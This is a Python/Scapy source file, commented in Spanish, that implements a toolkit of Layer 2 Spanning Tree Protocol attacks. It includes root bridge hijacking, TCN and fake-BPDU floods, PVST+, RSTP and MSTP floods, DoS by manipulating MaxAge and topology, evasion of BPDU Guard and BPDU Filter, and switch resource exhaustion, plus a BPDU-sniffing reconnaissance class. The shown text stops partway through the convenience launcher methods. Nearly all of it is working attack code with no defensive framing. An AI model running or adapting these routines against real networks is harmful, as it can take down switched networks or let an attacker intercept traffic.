import subprocess
import os
import random
import time
from time import sleep
from typing import Optional, List, Dict, Tuple
import threading
from scapy.all import *
from scapy.layers.l2 import *
import logging
import platform
import re
import struct

conf.promisc = True
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class STPAttacks:
    """Clase completa para TODOS los ataques STP (Spanning Tree Protocol) - Compatible macOS/Linux"""

    def __init__(self, iface: str, verbose: bool = False):
        self.iface = iface
        self.verbose = verbose
        self.active_attacks = {}
        self.running = False
        self.is_linux = platform.system() == 'Linux'
        self.is_macos = platform.system() == 'Darwin'

        # Configuración STP
        self.stp_bpdu_dst = "01:80:C2:00:00:00"
        self.stp_multicast = "01:00:0C:CC:CC:CD"  # PVST+
        self.stp_rstp_dst = "01:80:C2:00:00:00"  # RSTP/MSTP

        # Estados para ataques avanzados
        self.original_bridge_id = None
        self.attack_threads = []
        self.captured_bpdus = []

    def _generate_bridge_id(self, priority: int = 0, mac: str = None) -> bytes:
        """Generar Bridge ID para STP"""
        if mac is None:
            mac = RandMAC()
        elif isinstance(mac, str):
            mac = mac.replace(':', '').replace('-', '')

        # Bridge ID: 2 bytes priority + 6 bytes MAC
        priority_bytes = priority.to_bytes(2, 'big')
        mac_bytes = bytes.fromhex(mac)
        return priority_bytes + mac_bytes

    def send_bpdu(self, bpdu_packet: Packet, count: int = 1, interval: float = 2.0):
        """Enviar BPDU frames"""
        for i in range(count):
            try:
                sendp(bpdu_packet, iface=self.iface, verbose=False)
                if self.verbose and i % 10 == 0:
                    logging.info(f"📦 BPDU enviado #{i + 1}")
                if count > 1 and i < count - 1:
                    sleep(interval)
            except Exception as e:
                logging.error(f"❌ Error enviando BPDU: {e}")
                break

    # === ATAQUES BÁSICOS STP ===

    class RootHijackAttack:
        """Ataque de secuestro de Root Bridge"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_attack(self, priority: int = 0, root_mac: str = None,
                         count: Optional[int] = None, interval: float = 2.0):
            """Iniciar ataque de Root Hijack"""
            if self.running:
                logging.warning("⚠️ Ataque Root Hijack ya en ejecución")
                return

            self.running = True
            if root_mac is None:
                root_mac = RandMAC()

            if self.verbose:
                logging.info(f"👑 Iniciando Root Hijack - Priority: {priority}, MAC: {root_mac}")

            self.thread = threading.Thread(
                target=self._root_hijack_loop,
                args=(priority, root_mac, count, interval),
                daemon=True
            )
            self.thread.start()

        def _root_hijack_loop(self, priority: int, root_mac: str, count: Optional[int], interval: float):
            """Loop principal del ataque Root Hijack"""
            packets_sent = 0

            while self.running and (count is None or packets_sent < count):
                try:
                    # Crear BPDU Configuration con mejor prioridad
                    bpdu = Ether(dst="01:80:C2:00:00:00", src=root_mac)
                    bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
                    bpdu /= STP(
                        proto=0,
                        version=0,
                        bpdutype=0,  # Configuration BPDU
                        bpduflags=0,
                        rootid=priority,
                        rootmac=root_mac,
                        bridgeid=priority,
                        bridgemac=root_mac,
                        portid=0x8001,
                        age=0,
                        maxage=20,
                        hellotime=2,
                        fwddelay=15
                    )

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 5 == 0:
                        logging.info(f"📦 Root BPDUs enviados: {packets_sent}")

                    if count is None or packets_sent < count:
                        sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en Root Hijack: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 Root Hijack completado - Total BPDUs: {packets_sent}")

        def stop_attack(self):
            """Detener ataque Root Hijack"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 Root Hijack detenido")

    class TCNFloodAttack:
        """Ataque de inundación con TCN BPDUs"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_attack(self, src_mac: str = None, rate: int = 10, duration: Optional[int] = None):
            """Iniciar ataque TCN Flood"""
            if self.running:
                logging.warning("⚠️ Ataque TCN Flood ya en ejecución")
                return

            self.running = True
            if src_mac is None:
                src_mac = RandMAC()

            if self.verbose:
                logging.info(f"🌊 Iniciando TCN Flood - MAC: {src_mac}, Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._tcn_flood_loop,
                args=(src_mac, rate, duration),
                daemon=True
            )
            self.thread.start()

        def _tcn_flood_loop(self, src_mac: str, rate: int, duration: Optional[int]):
            """Loop principal del ataque TCN Flood"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    # Crear TCN BPDU
                    bpdu = Ether(dst="01:80:C2:00:00:00", src=src_mac)
                    bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
                    bpdu /= STP(
                        proto=0,
                        version=0,
                        bpdutype=2,  # TCN BPDU
                        bpduflags=0
                    )

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 20 == 0:
                        logging.info(f"📦 TCN BPDUs enviados: {packets_sent}")

                    # Verificar duración
                    if duration and (time.time() - start_time) > duration:
                        break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en TCN Flood: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 TCN Flood completado - Total BPDUs: {packets_sent}")

        def stop_attack(self):
            """Detener ataque TCN Flood"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 TCN Flood detenido")

    class FakeBPDUAttack:
        """Ataque de envío masivo de BPDUs falsos"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_attack(self, bpdu_count: int = 1000, rate: int = 50,
                         variation: bool = True):
            """Iniciar ataque de BPDUs falsos"""
            if self.running:
                logging.warning("⚠️ Ataque Fake BPDU ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"🎭 Iniciando Fake BPDU Attack - Count: {bpdu_count}, Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._fake_bpdu_loop,
                args=(bpdu_count, rate, variation),
                daemon=True
            )
            self.thread.start()

        def _fake_bpdu_loop(self, bpdu_count: int, rate: int, variation: bool):
            """Loop principal del ataque Fake BPDU"""
            interval = 1.0 / rate
            packets_sent = 0

            while self.running and packets_sent < bpdu_count:
                try:
                    # Variar parámetros para hacerlo más realista
                    if variation:
                        priority = random.randint(0, 61440)
                        mac = RandMAC()
                        port_id = random.randint(0x8001, 0x80FF)
                    else:
                        priority = 0
                        mac = "00:00:00:00:00:01"
                        port_id = 0x8001

                    # Crear BPDU con variaciones
                    bpdu = Ether(dst="01:80:C2:00:00:00", src=mac)
                    bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
                    bpdu /= STP(
                        proto=0,
                        version=random.choice([0, 2, 3]),  # Multiple STP versions
                        bpdutype=random.choice([0, 2]),  # Config o TCN
                        bpduflags=random.randint(0, 255),
                        rootid=priority,
                        rootmac=mac,
                        bridgeid=priority,
                        bridgemac=mac,
                        portid=port_id,
                        age=random.randint(0, 10),
                        maxage=random.choice([15, 20]),
                        hellotime=random.choice([1, 2]),
                        fwddelay=random.choice([10, 15])
                    )

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 100 == 0:
                        logging.info(f"📦 Fake BPDUs enviados: {packets_sent}/{bpdu_count}")

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en Fake BPDU Attack: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 Fake BPDU Attack completado - Total BPDUs: {packets_sent}")

        def stop_attack(self):
            """Detener ataque Fake BPDU"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 Fake BPDU Attack detenido")

    class PVSTAttack:
        """Ataques específicos para PVST+ (Per-VLAN Spanning Tree)"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_pvst_flood(self, vlan_range: range = range(1, 100),
                             rate: int = 10, duration: Optional[int] = None):
            """Inundar con BPDUs PVST+ para múltiples VLANs"""
            if self.running:
                logging.warning("⚠️ Ataque PVST Flood ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"🌊 Iniciando PVST Flood - VLANs: {vlan_range}, Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._pvst_flood_loop,
                args=(vlan_range, rate, duration),
                daemon=True
            )
            self.thread.start()

        def _pvst_flood_loop(self, vlan_range: range, rate: int, duration: Optional[int]):
            """Loop principal del ataque PVST Flood"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    for vlan_id in vlan_range:
                        if not self.running:
                            break

                        # Crear frame PVST+ para VLAN específica
                        src_mac = RandMAC()

                        # Ethernet con VLAN tagging
                        eth = Ether(dst="01:00:0C:CC:CC:CD", src=src_mac)
                        eth /= Dot1Q(vlan=vlan_id)
                        eth /= LLC(dsap=0xaa, ssap=0xaa, ctrl=3)  # SNAP para PVST+
                        eth /= SNAP(OUI=0x00000c, code=0x010b)  # Cisco PVST+

                        # STP para esta VLAN
                        eth /= STP(
                            rootid=0,
                            rootmac=src_mac,
                            bridgeid=0,
                            bridgemac=src_mac,
                            portid=0x8001
                        )

                        sendp(eth, iface=self.iface, verbose=False)
                        packets_sent += 1

                        if self.verbose and packets_sent % 50 == 0:
                            logging.info(f"📦 PVST+ BPDUs enviados: {packets_sent}")

                        # Verificar duración
                        if duration and (time.time() - start_time) > duration:
                            self.running = False
                            break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en PVST Flood: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 PVST Flood completado - Total BPDUs: {packets_sent}")

        def stop_attack(self):
            """Detener ataque PVST"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 PVST Attack detenido")

    class STPManipulationAttack:
        """Ataques de manipulación avanzada de STP"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_dos_attack(self, attack_type: str = "maxage", rate: int = 20,
                             duration: Optional[int] = None):
            """Ataque de Denegación de Servicio STP"""
            if self.running:
                logging.warning("⚠️ Ataque STP DoS ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"💥 Iniciando STP DoS - Tipo: {attack_type}, Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._stp_dos_loop,
                args=(attack_type, rate, duration),
                daemon=True
            )
            self.thread.start()

        def _stp_dos_loop(self, attack_type: str, rate: int, duration: Optional[int]):
            """Loop principal del ataque STP DoS"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    src_mac = RandMAC()

                    if attack_type == "maxage":
                        # BPDU con MaxAge máximo para forzar reconvergencia
                        bpdu = self._create_manipulated_bpdu(src_mac, maxage=40)
                    elif attack_type == "zeropath":
                        # BPDU con path cost cero
                        bpdu = self._create_manipulated_bpdu(src_mac, pathcost=0)
                    elif attack_type == "topology":
                        # Mezcla de BPDUs para crear inestabilidad
                        bpdu = self._create_topology_chaos(src_mac)
                    else:
                        bpdu = self._create_manipulated_bpdu(src_mac)

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 30 == 0:
                        logging.info(f"📦 STP DoS BPDUs enviados: {packets_sent}")

                    # Verificar duración
                    if duration and (time.time() - start_time) > duration:
                        break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en STP DoS: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 STP DoS completado - Total BPDUs: {packets_sent}")

        def _create_manipulated_bpdu(self, src_mac: str, **kwargs) -> Packet:
            """Crear BPDU manipulado"""
            bpdu = Ether(dst="01:80:C2:00:00:00", src=src_mac)
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)

            stp_fields = {
                'proto': 0,
                'version': 0,
                'bpdutype': 0,
                'bpduflags': 0,
                'rootid': kwargs.get('priority', 0),
                'rootmac': src_mac,
                'bridgeid': kwargs.get('priority', 0),
                'bridgemac': src_mac,
                'portid': 0x8001,
                'age': kwargs.get('age', 0),
                'maxage': kwargs.get('maxage', 20),
                'hellotime': kwargs.get('hellotime', 2),
                'fwddelay': kwargs.get('fwddelay', 15)
            }

            bpdu /= STP(**stp_fields)
            return bpdu

        def _create_topology_chaos(self, src_mac: str) -> Packet:
            """Crear BPDU que causa caos en la topología"""
            bpdu = Ether(dst="01:80:C2:00:00:00", src=src_mac)
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
            bpdu /= STP(
                proto=0,
                version=random.randint(0, 3),
                bpdutype=random.choice([0, 2]),
                bpduflags=random.randint(0, 255),
                rootid=random.randint(0, 61440),
                rootmac=RandMAC(),
                bridgeid=random.randint(0, 61440),
                bridgemac=RandMAC(),
                portid=random.randint(0x8001, 0x80FF),
                age=random.randint(0, 40),
                maxage=random.randint(1, 40),
                hellotime=random.randint(1, 10),
                fwddelay=random.randint(1, 30)
            )
            return bpdu

        def stop_attack(self):
            """Detener ataque STP Manipulation"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 STP Manipulation Attack detenido")

    # === ATAQUES AVANZADOS STP (NUEVOS) ===

    class RSTPAttack:
        """Ataques específicos para Rapid STP (802.1w)"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_rstp_flood(self, rate: int = 20, duration: Optional[int] = None):
            """Inundación con BPDUs RSTP para causar reconvergencia rápida constante"""
            if self.running:
                logging.warning("⚠️ Ataque RSTP ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"⚡ Iniciando RSTP Flood - Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._rstp_flood_loop,
                args=(rate, duration),
                daemon=True
            )
            self.thread.start()

        def _rstp_flood_loop(self, rate: int, duration: Optional[int]):
            """Loop principal del ataque RSTP"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    # BPDU RSTP (versión 2) con flags rápidos
                    bpdu = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
                    bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
                    bpdu /= STP(
                        proto=0,
                        version=2,  # RSTP version
                        bpdutype=0x02,  # RSTP BPDU
                        bpduflags=0x7C,  # Flags RSTP (Agreement, Forwarding, Learning, Port Role)
                        rootid=0,
                        rootmac=RandMAC(),
                        bridgeid=0,
                        bridgemac=RandMAC(),
                        portid=0x8001,
                        age=0,
                        maxage=20,
                        hellotime=2,
                        fwddelay=15
                    )

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 25 == 0:
                        logging.info(f"📦 RSTP BPDUs enviados: {packets_sent}")

                    if duration and (time.time() - start_time) > duration:
                        break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en RSTP Attack: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 RSTP Flood completado - Total BPDUs: {packets_sent}")

        def stop_attack(self):
            """Detener ataque RSTP"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 RSTP Attack detenido")

    class MSTPAttack:
        """Ataques para Multiple STP (802.1s)"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_mstp_flood(self, region_name: str = "ATTACK", revision: int = 1,
                             instances: int = 10, rate: int = 15, duration: Optional[int] = None):
            """Ataque MSTP con múltiples instancias y configuración falsa"""
            if self.running:
                logging.warning("⚠️ Ataque MSTP ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"🌐 Iniciando MSTP Flood - Instancias: {instances}, Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._mstp_flood_loop,
                args=(region_name, revision, instances, rate, duration),
                daemon=True
            )
            self.thread.start()

        def _mstp_flood_loop(self, region_name: str, revision: int, instances: int,
                             rate: int, duration: Optional[int]):
            """Loop principal del ataque MSTP"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    # Crear BPDU MSTP con configuración falsa
                    src_mac = RandMAC()

                    # Ethernet frame para MSTP
                    eth = Ether(dst="01:80:C2:00:00:00", src=src_mac)
                    eth /= LLC(dsap=0x42, ssap=0x42, ctrl=3)

                    # MSTP BPDU básico
                    eth /= STP(
                        proto=0,
                        version=3,  # MSTP version
                        bpdutype=0,
                        bpduflags=0,
                        rootid=0,
                        rootmac=src_mac,
                        bridgeid=0,
                        bridgemac=src_mac,
                        portid=0x8001,
                        age=0,
                        maxage=20,
                        hellotime=2,
                        fwddelay=15
                    )

                    sendp(eth, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 30 == 0:
                        logging.info(f"📦 MSTP BPDUs enviados: {packets_sent}")

                    if duration and (time.time() - start_time) > duration:
                        break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en MSTP Attack: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 MSTP Flood completado - Total BPDUs: {packets_sent}")

        def stop_attack(self):
            """Detener ataque MSTP"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 MSTP Attack detenido")

    class BPDUFilterBypass:
        """Ataques para evadir filtros BPDU Guard/BPDU Filter"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_filter_bypass(self, technique: str = "mac_rotation", rate: int = 10,
                                duration: Optional[int] = None):
            """Bypass de filtros BPDU usando diferentes técnicas"""
            if self.running:
                logging.warning("⚠️ Ataque BPDU Filter Bypass ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"🎯 Iniciando BPDU Filter Bypass - Técnica: {technique}")

            self.thread = threading.Thread(
                target=self._bypass_loop,
                args=(technique, rate, duration),
                daemon=True
            )
            self.thread.start()

        def _bypass_loop(self, technique: str, rate: int, duration: Optional[int]):
            """Loop principal para bypass de filtros"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    if technique == "mac_rotation":
                        # Rotación rápida de MACs para evadir filtros estáticos
                        bpdu = self._create_mac_rotation_bpdu()
                    elif technique == "vlan_hopping":
                        # Saltar entre VLANs para evadir filtros
                        bpdu = self._create_vlan_hopping_bpdu()
                    elif technique == "fragmentation":
                        # Fragmentación de BPDUs (raro pero posible)
                        bpdu = self._create_fragmented_bpdu()
                    else:
                        bpdu = self._create_mac_rotation_bpdu()

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 20 == 0:
                        logging.info(f"📦 Bypass BPDUs enviados: {packets_sent}")

                    if duration and (time.time() - start_time) > duration:
                        break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en BPDU Filter Bypass: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 BPDU Filter Bypass completado - Total BPDUs: {packets_sent}")

        def _create_mac_rotation_bpdu(self) -> Packet:
            """Crear BPDU con rotación de MACs"""
            bpdu = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
            bpdu /= STP(
                proto=0,
                version=random.choice([0, 2, 3]),
                bpdutype=0,
                bpduflags=random.randint(0, 255),
                rootid=random.randint(0, 61440),
                rootmac=RandMAC(),
                bridgeid=random.randint(0, 61440),
                bridgemac=RandMAC(),
                portid=random.randint(0x8001, 0x80FF),
                age=0,
                maxage=20,
                hellotime=2,
                fwddelay=15
            )
            return bpdu

        def _create_vlan_hopping_bpdu(self) -> Packet:
            """Crear BPDU con VLAN hopping"""
            vlan_id = random.randint(1, 4094)
            eth = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
            eth /= Dot1Q(vlan=vlan_id)
            eth /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
            eth /= STP(
                proto=0,
                version=0,
                bpdutype=0,
                bpduflags=0,
                rootid=0,
                rootmac=RandMAC(),
                bridgeid=0,
                bridgemac=RandMAC(),
                portid=0x8001,
                age=0,
                maxage=20,
                hellotime=2,
                fwddelay=15
            )
            return eth

        def _create_fragmented_bpdu(self) -> Packet:
            """Crear BPDU fragmentado (concepto teórico)"""
            # Nota: STP no soporta fragmentación real, pero podemos enviar BPDUs inusuales
            bpdu = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)

            # BPDU con campos inusuales
            stp = STP(
                proto=0,
                version=0,
                bpdutype=0,
                bpduflags=0x80,  # Topology Change
                rootid=0x1000,
                rootmac=RandMAC(),
                bridgeid=0x1000,
                bridgemac=RandMAC(),
                portid=0x8001,
                age=255,  # Valor inusual
                maxage=255,  # Valor inusual
                hellotime=255,  # Valor inusual
                fwddelay=255  # Valor inusual
            )

            bpdu /= stp
            return bpdu

        def stop_attack(self):
            """Detener ataque BPDU Filter Bypass"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 BPDU Filter Bypass detenido")

    class STPReconnaissance:
        """Ataques de reconocimiento y análisis STP"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None
            self.discovered_bridges = []

        def start_reconnaissance(self, duration: int = 30):
            """Escuchar BPDUs para reconocimiento de topología STP"""
            if self.running:
                logging.warning("⚠️ Reconocimiento STP ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"🔍 Iniciando reconocimiento STP - Duración: {duration}s")

            self.thread = threading.Thread(
                target=self._recon_loop,
                args=(duration,),
                daemon=True
            )
            self.thread.start()

        def _recon_loop(self, duration: int):
            """Loop principal de reconocimiento"""
            start_time = time.time()

            def packet_handler(pkt):
                if STP in pkt:
                    bridge_info = self._analyze_bpdu(pkt)
                    if bridge_info and bridge_info not in self.discovered_bridges:
                        self.discovered_bridges.append(bridge_info)
                        if self.verbose:
                            logging.info(f"🔍 Bridge descubierto: {bridge_info}")

            try:
                # Sniff BPDUs por el tiempo especificado
                sniff(iface=self.iface, filter="ether dst 01:80:c2:00:00:00",
                      prn=packet_handler, timeout=duration, store=0)

            except Exception as e:
                logging.error(f"❌ Error en reconocimiento STP: {e}")

            self.running = False

            if self.verbose:
                logging.info(f"🔍 Reconocimiento completado - Bridges encontrados: {len(self.discovered_bridges)}")
                for bridge in self.discovered_bridges:
                    logging.info(f"   - {bridge}")

        def _analyze_bpdu(self, pkt) -> Dict:
            """Analizar BPDU y extraer información del bridge"""
            try:
                stp = pkt[STP]
                return {
                    'root_bridge': f"{stp.rootid:04x}:{stp.rootmac}",
                    'designated_bridge': f"{stp.bridgeid:04x}:{stp.bridgemac}",
                    'port_id': hex(stp.portid),
                    'version': stp.version,
                    'age': stp.age,
                    'max_age': stp.maxage,
                    'hello_time': stp.hellotime,
                    'forward_delay': stp.fwddelay
                }
            except Exception as e:
                logging.error(f"❌ Error analizando BPDU: {e}")
                return None

        def get_discovered_bridges(self) -> List[Dict]:
            """Obtener lista de bridges descubiertos"""
            return self.discovered_bridges

        def stop_reconnaissance(self):
            """Detener reconocimiento"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 Reconocimiento STP detenido")

    class STPResourceExhaustion:
        """Ataques de agotamiento de recursos STP"""

        def __init__(self, iface: str, verbose: bool = False):
            self.iface = iface
            self.verbose = verbose
            self.running = False
            self.thread = None

        def start_resource_exhaustion(self, attack_type: str = "memory",
                                      rate: int = 100, duration: Optional[int] = None):
            """Ataque de agotamiento de recursos en switches"""
            if self.running:
                logging.warning("⚠️ Ataque Resource Exhaustion ya en ejecución")
                return

            self.running = True

            if self.verbose:
                logging.info(f"💥 Iniciando Resource Exhaustion - Tipo: {attack_type}, Rate: {rate}/s")

            self.thread = threading.Thread(
                target=self._exhaustion_loop,
                args=(attack_type, rate, duration),
                daemon=True
            )
            self.thread.start()

        def _exhaustion_loop(self, attack_type: str, rate: int, duration: Optional[int]):
            """Loop principal de agotamiento de recursos"""
            interval = 1.0 / rate
            start_time = time.time()
            packets_sent = 0

            while self.running:
                try:
                    if attack_type == "memory":
                        bpdu = self._create_memory_exhaustion_bpdu()
                    elif attack_type == "cpu":
                        bpdu = self._create_cpu_exhaustion_bpdu()
                    elif attack_type == "topology_table":
                        bpdu = self._create_topology_table_exhaustion_bpdu()
                    else:
                        bpdu = self._create_memory_exhaustion_bpdu()

                    sendp(bpdu, iface=self.iface, verbose=False)
                    packets_sent += 1

                    if self.verbose and packets_sent % 50 == 0:
                        logging.info(f"📦 Resource Exhaustion BPDUs: {packets_sent}")

                    if duration and (time.time() - start_time) > duration:
                        break

                    sleep(interval)

                except Exception as e:
                    logging.error(f"❌ Error en Resource Exhaustion: {e}")
                    break

            if self.verbose:
                logging.info(f"🛑 Resource Exhaustion completado - Total BPDUs: {packets_sent}")

        def _create_memory_exhaustion_bpdu(self) -> Packet:
            """Crear BPDU para agotar memoria"""
            # BPDU con múltiples campos y datos extra
            bpdu = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)

            # STP con valores complejos
            stp = STP(
                proto=0,
                version=0,
                bpdutype=0,
                bpduflags=random.randint(0, 255),
                rootid=random.randint(0, 0xFFFF),
                rootmac=RandMAC(),
                bridgeid=random.randint(0, 0xFFFF),
                bridgemac=RandMAC(),
                portid=random.randint(0x8001, 0x80FF),
                age=random.randint(0, 255),
                maxage=random.randint(1, 255),
                hellotime=random.randint(1, 255),
                fwddelay=random.randint(1, 255)
            )

            bpdu /= stp
            return bpdu

        def _create_cpu_exhaustion_bpdu(self) -> Packet:
            """Crear BPDU para agotar CPU con cálculos complejos"""
            # BPDUs que fuerzan recálculos constantes
            bpdu = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
            bpdu /= STP(
                proto=0,
                version=0,
                bpdutype=0,
                bpduflags=0x80,  # Topology Change
                rootid=random.randint(0, 61440),
                rootmac=RandMAC(),
                bridgeid=random.randint(0, 61440),
                bridgemac=RandMAC(),
                portid=0x8001,
                age=0,
                maxage=6,  # Muy corto para forzar reconvergencia
                hellotime=1,  # Muy corto
                fwddelay=4  # Muy corto
            )
            return bpdu

        def _create_topology_table_exhaustion_bpdu(self) -> Packet:
            """Crear BPDU para llenar tablas de topología"""
            bpdu = Ether(dst="01:80:C2:00:00:00", src=RandMAC())
            bpdu /= LLC(dsap=0x42, ssap=0x42, ctrl=3)
            bpdu /= STP(
                proto=0,
                version=0,
                bpdutype=0,
                bpduflags=0,
                rootid=random.randint(0, 0xFFF0),
                rootmac=RandMAC(),
                bridgeid=random.randint(0, 0xFFF0),
                bridgemac=RandMAC(),
                portid=random.randint(0x8001, 0x80FF),
                age=0,
                maxage=20,
                hellotime=2,
                fwddelay=15
            )
            return bpdu

        def stop_attack(self):
            """Detener ataque Resource Exhaustion"""
            if self.running:
                self.running = False
                if self.thread and self.thread.is_alive():
                    self.thread.join(timeout=3)
                if self.verbose:
                    logging.info("🛑 Resource Exhaustion detenido")

    # === MÉTODOS DE CONVENIENCIA PARA TODOS LOS ATAQUES ===

    def start_root_hijack(self, priority: int = 0, root_mac: str = None,
                          count: Optional[int] = None, interval: float = 2.0) -> RootHijackAttack:
        """Iniciar ataque de Root Hijack"""
        attack = self.RootHijackAttack(self.iface, self.verbose)
        attack.start_attack(priority, root_mac, count, interval)
        self.active_attacks['root_hijack'] = attack
        return attack

    def start_tcn_flood(self, src_mac: str = None, rate: int = 10,
                        duration: Optional[int] = None) -> TCNFloodAttack:
        """Iniciar ataque TCN Flood"""
        attack = self.TCNFloodAttack(self.iface, self.verbose)
        attack.start_attack(src_mac, rate, duration)
        self.active_attacks['tcn_flood'] = attack
        return attack

    def start_fake_bpdu_attack(self, bpdu_count: int = 1000, rate: int = 50,
                               variation: bool = True) -> FakeBPDUAttack:
        """Iniciar ataque de BPDUs falsos"""
        attack = self.FakeBPDUAttack(self.iface, self.verbose)
        attack.start_attack(bpdu_count, rate, variation)
        self.active_attacks['fake_bpdu'] = attack
        return attack

    def start_pvst_attack(self, vlan_range: range = range(1, 100),
                          rate: int = 10, duration: Optional[int] = None) -> PVSTAttack:
        """Iniciar ataque PVST Flood"""
        attack = self.PVSTAttack(self.iface, self.verbose)
        attack.start_pvst_flood(vlan_range, rate, duration)
        self.active_attacks['pvst'] = attack
        return attack

    def start_stp_dos(self, attack_type: str = "maxage", rate: int = 20,
                      duration: Optional[int] = None) -> STPManipulationAttack:
        """Iniciar ataque STP DoS"""
        attack = self.STPManipulationAttack(self.iface, self.verbose)
        attack.start_dos_attack(attack_type, rate, duration)
        self.active_attacks['stp_dos'] = attack
        return attack

    def start_rstp_attack(self, rate: int = 20, duration: Optional[int] = None) -> RSTPAttack:
        """Iniciar ataque RSTP"""
        attack = self.RSTPAttack(self.iface, self.verbose)
        attack.start_rstp_flood(rate, duration)
        self.active_attacks['rstp'] = attack
